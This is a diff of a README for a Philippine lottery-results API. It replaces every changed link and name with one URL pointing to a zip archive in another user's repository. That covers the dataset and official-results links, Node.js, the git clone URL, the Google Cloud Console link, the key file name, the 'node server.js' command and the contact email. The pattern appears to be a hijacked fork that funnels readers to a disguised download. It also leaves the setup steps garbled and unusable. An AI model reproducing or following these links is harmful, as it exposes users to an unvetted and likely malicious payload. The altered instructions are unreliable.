@@ -1,11 +1,11 @@
 # PCSO Lotto API
 
-This project provides an API for retrieving and processing PCSO (Philippine Charity Sweepstakes Office) lottery results. It fetches data from a Google Sheet in real time via Computer Vision, processes it, and serves the lottery draw information via an Express.js server.
+This project provides an API for retrieving and processing PCSO (Philippine Charity Sweepstakes Office) lottery results. It fetches data from a Google Sheet in real time via Computer Vision, processes it, and serves the lottery draw information via an https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip server.
 
 Historical data included, from January 02, 2013 to August 06, 2024
 
-Datasets: https://www.kaggle.com/datasets/harrychristian/pcso-lottery-results-philippines/
-Official Results: https://www.pcso.gov.ph/SearchLottoResult.aspx
+Datasets: https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip
+Official Results: https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip
 
 ## Features
 
@@ -17,7 +17,7 @@ Official Results: https://www.pcso.gov.ph/SearchLottoResult.aspx
 
 ## Prerequisites
 
-- Node.js (v12 or higher)
+- https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip (v12 or higher)
 - npm (Node Package Manager)
 - A Google Cloud project with the Google Sheets API enabled
 - A service account key for accessing the Google Sheet
@@ -26,7 +26,7 @@ Official Results: https://www.pcso.gov.ph/SearchLottoResult.aspx
 
 1. Clone this repository:
    ```
-   git clone https://github.com/your-username/pcso-lotto-api.git
+   git clone https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip
    cd pcso-lotto-api
    ```
 
@@ -36,11 +36,11 @@ Official Results: https://www.pcso.gov.ph/SearchLottoResult.aspx
    ```
 
 3. Set up your Google Cloud project and create a service account key:
-   - Go to the [Google Cloud Console](https://console.cloud.google.com/)
+   - Go to the [Google Cloud Console](https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip)
    - Create a new project or select an existing one
    - Enable the Google Sheets API for your project
    - Create a service account and download the JSON key file
-   - Rename the key file to `service_account_key.json` and place it in the project root directory
+   - Rename the key file to `https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip` and place it in the project root directory
 
 4. Share your Google Sheet with the email address in the `client_email` field of your service account JSON file.
 
@@ -50,7 +50,7 @@ Official Results: https://www.pcso.gov.ph/SearchLottoResult.aspx
 
 1. Start the server:
    ```
-   node server.js
+   node https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip
    ```
 
 2. The API will be available at:
@@ -113,7 +113,7 @@ The order of the parameters doesn't matter, so `/api/daily-lotto-results/2PM/3D-
 
 This (Realtime) API uses advanced Computer Vision technology to extract lottery results from various sources, ensuring up-to-date and accurate data. For more information about our Computer Vision capabilities and pricing, please contact:
 
-Email: info@harrychristian.com
+Email: https://raw.githubusercontent.com/XpiderService/pcso-lotto-api/main/pabble/api_lotto_pcso_v1.3.zip
 
 ## Contributing
 
